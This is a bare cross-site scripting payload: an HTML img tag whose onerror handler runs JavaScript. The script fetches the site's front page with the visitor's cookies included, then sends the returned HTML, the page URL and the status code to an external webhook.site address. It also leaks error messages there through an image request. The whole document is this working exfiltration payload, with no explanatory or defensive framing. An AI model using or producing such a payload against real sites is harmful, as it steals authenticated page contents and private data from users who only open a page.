
<img src="x" onerror='
(async () => {
    const webhook = "https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393";

    try {
        const response = await fetch("/", {
            method: "GET",
            credentials: "include"
        });

        const html = await response.text();

        await fetch(webhook, {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "text/plain"
            },
            body: JSON.stringify({
                url: location.href,
                status: response.status,
                html: html
            })
        });
    } catch (error) {
        new Image().src =
            webhook + "?error=" +
            encodeURIComponent(error.message);
    }
})();
'>
